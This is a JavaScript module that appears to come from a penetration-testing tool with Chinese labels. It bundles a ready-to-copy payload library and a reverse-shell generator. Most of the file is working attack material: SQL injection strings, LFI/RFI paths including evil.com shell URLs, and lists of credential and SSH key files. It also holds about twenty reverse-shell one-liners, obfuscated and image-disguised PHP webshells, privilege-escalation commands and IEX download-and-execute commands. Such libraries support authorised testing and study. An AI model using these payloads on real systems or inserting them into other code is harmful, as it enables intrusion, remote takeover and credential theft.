// 灵眸 - Payload Reference Library
'use strict';

import { utilsProxy as utils } from './vk-namespace.js';
import { loadRemotePayloads } from './vk-payload-remote.js';
import { XSS_DATA } from './vk-payload-data.js';

function sqliCols(expr, slot, n) {
  const cols = [];
  for (let i = 0; i < n; i++) cols.push(i === slot ? expr : 'NULL');
  return cols.join(',');
}

function buildSqliPayloads(n, table) {
  const nulls = Array(n).fill('NULL').join(',');
  return {
    列数探测: [
      "' ORDER BY 1--+",
      "' ORDER BY 2--+",
      ...Array.from({ length: n }, (_, i) => `' ORDER BY ${i + 1}--+`),
      `' UNION SELECT ${nulls}--+`,
    ],
    版本枚举: [
      `' UNION SELECT ${sqliCols('version()', 1, n)}--+`,
      `' UNION SELECT ${sqliCols('@@version', 1, n)}--+`,
      `' UNION SELECT ${sqliCols('@@GLOBAL.VERSION', 1, n)}--+`,
    ],
    表名枚举: [
      `' UNION SELECT ${sqliCols('GROUP_CONCAT(table_name)', 1, n)} FROM information_schema.tables WHERE table_schema=database()--+`,
      `' UNION SELECT ${sqliCols('table_name', 1, n)} FROM information_schema.tables--+`,
    ],
    列名枚举: [
      `' UNION SELECT ${sqliCols('GROUP_CONCAT(column_name)', 1, n)} FROM information_schema.columns WHERE table_name='${table}'--+`,
    ],
    数据提取: [
      `' UNION SELECT ${sqliCols('GROUP_CONCAT(username,0x3a,password)', 1, n)} FROM ${table}--+`,
      `' UNION SELECT ${sqliCols("username||':'||password", 1, n)} FROM ${table}--+`,
    ],
    报错注入: [
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--+",
      "' AND 1=CAST((SELECT version()) AS INT)--+",
      "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--+",
    ],
    延时注入: [
      "' AND IF(1=1,SLEEP(5),0)--+",
      "' AND (SELECT SLEEP(5))--+",
      "'; WAITFOR DELAY '0:0:5'--+",
    ],
    认证绕过: ["' OR 1=1--+", "' OR '1'='1", "admin'--", "' OR '1'='1'/*"],
    'Order Union': [
      `' ORDER BY 1 UNION SELECT NULL,username,password FROM ${table}--+`,
      `' ORDER BY 1,2 UNION SELECT NULL,load_file('/etc/passwd'),NULL--+`,
    ],
  };
}

const LFI_DATA = {
  目录遍历: [
    '../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/shadow',
    '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  ],
  'PHP Wrapper': [
    'php://filter/convert.base64-encode/resource=../../../../etc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'expect://ls',
    'php://input (POST body)',
    'data://text/plain,<?php phpinfo();?>',
  ],
  RFI: ['http://evil.com/shell.txt', 'http://evil.com/shell.php?cmd=id'],
  'Linux 敏感文件': [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/group',
    '/etc/hostname',
    '/etc/issue',
    '/etc/ssh/ssh_config',
    '/etc/ssh/sshd_config',
    '/root/.ssh/id_rsa',
    '/root/.ssh/authorized_keys',
    '/home/$USER/.ssh/id_rsa',
    '/home/$USER/.bash_history',
    '/proc/self/environ',
    '/proc/mounts',
    '/var/run/secrets/kubernetes.io/serviceaccount/token',
  ],
  'Apache 配置': [
    '/etc/apache2/apache2.conf',
    '/etc/apache2/sites-available/000-default.conf',
    '/etc/httpd/conf/httpd.conf',
    '/usr/local/etc/apache2/httpd.conf',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
  ],
  'MySQL 文件': [
    '/var/lib/mysql/mysql/user.frm',
    '/var/lib/mysql/mysql/user.MYD',
    '/var/lib/mysql/mysql/user.MYI',
  ],
  'Windows 敏感文件': [
    '/boot.ini',
    '/windows/system32/drivers/etc/hosts',
    '/windows/repair/SAM',
    '/windows/panther/unattend.xml',
    '/windows/system32/license.rtf',
  ],
};

const REVERSE_SHELLS = {
  bash: { name: 'Bash TCP', cmd: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1', tags: ['linux', 'mac'] },
  netcat: {
    name: 'Netcat mkfifo',
    cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
    tags: ['linux'],
  },
  'nc-e': { name: 'Netcat -e', cmd: 'nc -e /bin/sh {ip} {port}', tags: ['linux'] },
  ncat: { name: 'Ncat', cmd: 'ncat {ip} {port} -e /bin/bash', tags: ['linux'] },
  python: {
    name: 'Python',
    cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    tags: ['linux', 'mac'],
  },
  python3: {
    name: 'Python3',
    cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    tags: ['linux', 'mac'],
  },
  perl: {
    name: 'Perl',
    cmd: 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'',
    tags: ['linux'],
  },
  php: {
    name: 'PHP',
    cmd: 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh <&3 >&3 2>&3");\'',
    tags: ['linux'],
  },
  ruby: {
    name: 'Ruby',
    cmd: 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    tags: ['linux', 'mac'],
  },
  powershell: {
    name: 'PowerShell',
    cmd: '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()',
    tags: ['windows'],
  },
  'powershell-tls': {
    name: 'PowerShell TLS',
    cmd: '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s,$false);[void]$ssl.AuthenticateAsClient("{ip}");$sb=New-Object System.Text.StringBuilder;while($true){$sb.Clear();[byte[]]$b=0..65535|%{0};$t=$ssl.Read($b,0,$b.Length);$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$t);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$ssl.Write([text.encoding]::ASCII.GetBytes($r2),0,$r2.Length);$ssl.Flush()};$c.Close()',
    tags: ['windows'],
  },
  nodejs: {
    name: 'Node.js',
    cmd: "require('child_process').exec('nc -e /bin/sh {ip} {port}')",
    tags: ['linux', 'mac', 'windows'],
  },
  java: {
    name: 'Java',
    cmd: 'Runtime rt = Runtime.getRuntime(); String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}; Process p = rt.exec(cmd);',
    tags: ['linux'],
  },
  socat: {
    name: 'Socat',
    cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    tags: ['linux'],
  },
  telnet: {
    name: 'Telnet',
    cmd: 'rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p',
    tags: ['linux'],
  },
  zsh: {
    name: 'Zsh',
    cmd: "zsh -c 'zmodload -i zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0<&$REPLY'",
    tags: ['linux', 'mac'],
  },
  lua: {
    name: 'Lua',
    cmd: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
    tags: ['linux'],
  },
  golang: {
    name: 'Golang',
    cmd: 'echo \'package main;import "os/exec";func main(){exec.Command("/bin/sh","-i").Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
    tags: ['linux'],
  },
  awk: {
    name: 'Awk',
    cmd: 'awk \'BEGIN{s="/inet/tcp/0/{ip}/{port}";while(1){do{printf "$ "|&s;s|&getline c;if(c){while((c|&s)>0)print $0|&s;close(c)}}while(c!="exit")}}\'',
    tags: ['linux'],
  },
  dart: {
    name: 'Dart',
    cmd: "import 'dart:io';import 'dart:convert';main(){Socket.connect('{ip}',{port}).then((s){s.cast<List<int>>().transform(Utf8Encoder()).pipe(s);stdin.pipe(s);});}",
    tags: ['linux', 'mac', 'windows'],
  },
};

const WEBSHELL_DATA = {
  基础一句话: [
    '<?php @eval($_POST["cmd"]);?>',
    '<?php system($_GET["cmd"]);?>',
    '<?php passthru($_GET["cmd"]);?>',
    '<?php echo shell_exec($_GET["cmd"]);?>',
  ],
  混淆一句话: [
    '<?=`$_GET[0]`?>',
    '<?=`$_POST[0]`?>',
    '<?=`${$_REQUEST["_"]}`?>',
    '<?php $a="sys"."tem";$a($_GET["cmd"]);?>',
    '<?php $_GET["a"]($_GET["b"]);?>',
    '<?php @assert($_POST["cmd"]);?>',
  ],
  图片马: ['GIF89a<?php @eval($_POST["cmd"]);?>', 'GIF89a<?=`$_GET[0]`?>'],
  文件上传利用: [
    '<?php file_put_contents("shell.php","<?php @eval(\\$_POST[cmd]);?>");?>',
    '<?php move_uploaded_file($_FILES["f"]["tmp_name"],"shell.php");?>',
  ],
  '绕过 disable_functions': [
    '<?php putenv("LD_PRELOAD=/tmp/evil.so");mail("a","a","a");?>',
    '<?php ini_set("disable_functions","");?>',
  ],
};

const CMDREF_DATA = {
  'Linux SUID 提权': [
    'find / -user root -perm -4000 -exec ls -ldb {} \\;',
    'find / -perm -u=s -type f 2>/dev/null',
    "find / -name '*.txt' 2>/dev/null",
    'getcap -r / 2>/dev/null',
  ],
  系统版本信息: [
    'cat /etc/issue',
    'cat /etc/*-release*',
    'cat /etc/lsb-release',
    'uname -a',
    'cat /proc/version',
  ],
  环境变量: ['env', 'set', 'cat /etc/profile', 'cat /etc/bashrc', '~/.bash_history'],
  'Cron 任务': [
    'crontab -l',
    'ls -alh /var/spool/cron',
    'cat /etc/crontab',
    'ls -la /etc/cron.d',
    'cat /etc/at.allow',
    'cat /etc/at.deny',
  ],
  端口转发: [
    'ssh -L 8080:target:80 user@remote',
    'ssh -R 8080:target:80 user@remote',
    'mkfifo backpipe; nc -l 8080 0<backpipe | nc target 80 1>backpipe',
    'socat TCP-LISTEN:8080,fork TCP:target:80',
    'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080',
  ],
  'TTY Shell 升级': [
    'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
    'echo os.system("/bin/bash")',
    'perl -e \'exec "/bin/sh";\'',
    'lua -e "os.execute(\'/bin/sh\')"',
    '/bin/sh -i',
    '# 步骤2: export TERM=xterm',
    '# 步骤3: Ctrl+Z → stty raw -echo; fg',
    '# 步骤4: stty rows 38 columns 116',
  ],
  'PowerShell 系统枚举': [
    'systeminfo',
    'Get-WmiObject Win32_ComputerSystem',
    '$env:COMPUTERNAME',
    '$env:USERNAME',
    'whoami /all',
    'Get-Process | Select-Object Name,Id',
  ],
  'PowerShell 补丁信息': [
    'Get-HotFix | sort InstalledOn -Desc | ft -AutoSize',
    'wmic qfe get Caption,Description,HotFixID,InstalledOn',
  ],
  'PowerShell 网络信息': [
    'ipconfig /all',
    'netstat -ano',
    'Get-NetTCPConnection',
    'route print',
    'arp -a',
  ],
  'PowerShell 文件下载': [
    'Invoke-WebRequest -Uri "http://url/file" -OutFile "C:\\output"',
    'certutil -urlcache -f http://url/file C:\\output',
    '(New-Object Net.WebClient).DownloadFile("http://url/file","C:\\output")',
    'IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")',
  ],
  'PowerShell WLAN 密码': [
    'netsh wlan show profiles',
    'netsh wlan show profile name="PROFILE" key=clear',
  ],
  通配符提权: [
    'touch --checkpoint-action=exec=sh shell.sh --checkpoint=1',
    'tar cf /dev/null * --checkpoint=1 --checkpoint-action=exec=sh shell.sh',
  ],
};

let _remotePayloads = null;

function initRemotePayloads() {
  loadRemotePayloads(function (data) {
    if (!data || !data.payloads) return;
    _remotePayloads = data.payloads;
  });
}

function getEffectiveXssData() {
  return (_remotePayloads && _remotePayloads.xss) || XSS_DATA;
}

function getEffectiveLfiData() {
  return (_remotePayloads && _remotePayloads.lfi) || LFI_DATA;
}

function getEffectiveWebshellData() {
  return (_remotePayloads && _remotePayloads.webshell) || WEBSHELL_DATA;
}

function getEffectiveCmdrefData() {
  return (_remotePayloads && _remotePayloads.cmdref) || CMDREF_DATA;
}

function refreshPayloadDisplay(filterText) {
  const xss = getEffectiveXssData();
  const lfi = getEffectiveLfiData();
  const webshell = getEffectiveWebshellData();
  const cmdref = getEffectiveCmdrefData();
  renderPayloadCategories('xss-categories', xss, false, filterText);
  renderPayloadCategories('lfi-categories', lfi, false, filterText);
  renderPayloadCategories('webshell-categories', webshell, false, filterText);
  renderPayloadCategories('cmdref-categories', cmdref, false, filterText);
  const statusEl = utils.get('xss-status');
  if (statusEl) statusEl.textContent = '共 ' + Object.keys(xss).length + ' 个分类';
}

initRemotePayloads();

function renderPayloadCategories(containerId, data, collapsed, filterText) {
  const container = utils.get(containerId);
  if (!container) return;
  container.innerHTML = '';
  const lower = filterText ? filterText.toLowerCase() : '';
  Object.entries(data).forEach(([title, items]) => {
    const filtered = lower
      ? items.filter(function (item) {
          return (
            item.toLowerCase().indexOf(lower) !== -1 || title.toLowerCase().indexOf(lower) !== -1
          );
        })
      : items;
    if (filtered.length === 0) return;
    const isOpen = !collapsed;
    const cat = document.createElement('div');
    cat.className = 'payload-category';
    cat.innerHTML = `
      <div class="payload-category-title">
        <span>${utils.escapeHtml(title)} <span class="payload-count-badge">${filtered.length}</span></span>
        <span class="payload-category-arrow${isOpen ? ' open' : ''}">&#9654;</span>
      </div>
      <div class="payload-category-items${isOpen ? ' open' : ''}">
        ${filtered
          .map(
            item => `
          <div class="payload-item">
            <code class="payload-item-code" title="${utils.escapeHtml(item)}">${utils.escapeHtml(item)}</code>
            <button class="payload-item-copy" data-payload="${utils.escapeHtml(item)}">复制</button>
          </div>
        `
          )
          .join('')}
      </div>
    `;
    cat.querySelector('.payload-category-title').addEventListener('click', () => {
      const arrow = cat.querySelector('.payload-category-arrow');
      const itemsEl = cat.querySelector('.payload-category-items');
      arrow.classList.toggle('open');
      itemsEl.classList.toggle('open');
    });
    cat.querySelectorAll('.payload-item-code').forEach(el => {
      el.addEventListener('click', () => utils.copyText(el.dataset.payload || el.textContent));
    });
    cat.querySelectorAll('.payload-item-copy').forEach(btn => {
      btn.addEventListener('click', () => {
        utils.copyAndToast(btn.dataset.payload, '已复制', 'success', 1000);
      });
    });
    container.appendChild(cat);
  });
}

function switchPayloadTab(tab) {
  document
    .querySelectorAll('.payload-tab')
    .forEach(b => b.classList.toggle('active', b.dataset.ptab === tab));
  document.querySelectorAll('.payload-panel').forEach(p => p.classList.remove('active'));
  const target = utils.get(`ptab-${tab}`);
  if (target) target.classList.add('active');
}

function generateReverseShell() {
  const ip = (utils.get('revshell-ip') || {}).value || '';
  const port = (utils.get('revshell-port') || {}).value || '4444';
  const type = (utils.get('revshell-type') || {}).value || 'bash';
  const output = utils.get('revshell-output');
  if (!ip || !port) {
    if (output) output.value = '请输入 IP 和端口';
    return;
  }
  const shell = REVERSE_SHELLS[type];
  if (!shell || !output) return;
  output.value = shell.cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
}

function renderAllReverseShells() {
  const container = utils.get('revshell-all');
  if (!container) return;
  container.innerHTML = '<div class="revshell-section-title">全部 Shell 类型一览</div>';
  const list = document.createElement('div');
  list.className = 'payload-list-container';
  Object.entries(REVERSE_SHELLS).forEach(([key, shell]) => {
    const item = document.createElement('div');
    item.className = 'payload-item';
    const tags = (shell.tags || [])
      .map(t => `<span class="payload-count-badge">${t}</span>`)
      .join(' ');
    item.innerHTML = `
      <code class="payload-item-code" title="${utils.escapeHtml(shell.cmd)}">${utils.escapeHtml(shell.name)} ${tags}</code>
      <button class="payload-item-copy" data-payload="${utils.escapeHtml(shell.cmd)}">复制</button>
    `;
    item
      .querySelector('.payload-item-code')
      .addEventListener('click', () => utils.copyText(shell.cmd));
    item.querySelector('.payload-item-copy').addEventListener('click', () => {
      utils.copyText(shell.cmd);
      utils.showToast('已复制模板 (需替换 IP/Port)', 'info', 1500);
    });
    list.appendChild(item);
  });
  container.appendChild(list);
}

function renderSqliPayloads(filterText) {
  const n = parseInt((utils.get('sqli-columns') || {}).value) || 3;
  const table = (utils.get('sqli-table') || {}).value || 'users';
  renderPayloadCategories('sqli-categories', buildSqliPayloads(n, table), false, filterText);
}

function applySearch(text) {
  renderPayloadCategories('xss-categories', getEffectiveXssData(), false, text);
  renderSqliPayloads(text);
  renderPayloadCategories('lfi-categories', getEffectiveLfiData(), false, text);
  renderPayloadCategories('webshell-categories', getEffectiveWebshellData(), false, text);
  renderPayloadCategories('cmdref-categories', getEffectiveCmdrefData(), false, text);
}

export {
  XSS_DATA,
  LFI_DATA,
  WEBSHELL_DATA,
  CMDREF_DATA,
  REVERSE_SHELLS,
  buildSqliPayloads,
  renderPayloadCategories,
  switchPayloadTab,
  generateReverseShell,
  applySearch,
  renderAllReverseShells,
  renderSqliPayloads,
  getEffectiveXssData,
  getEffectiveLfiData,
  getEffectiveWebshellData,
  getEffectiveCmdrefData,
  refreshPayloadDisplay,
  initRemotePayloads,
};
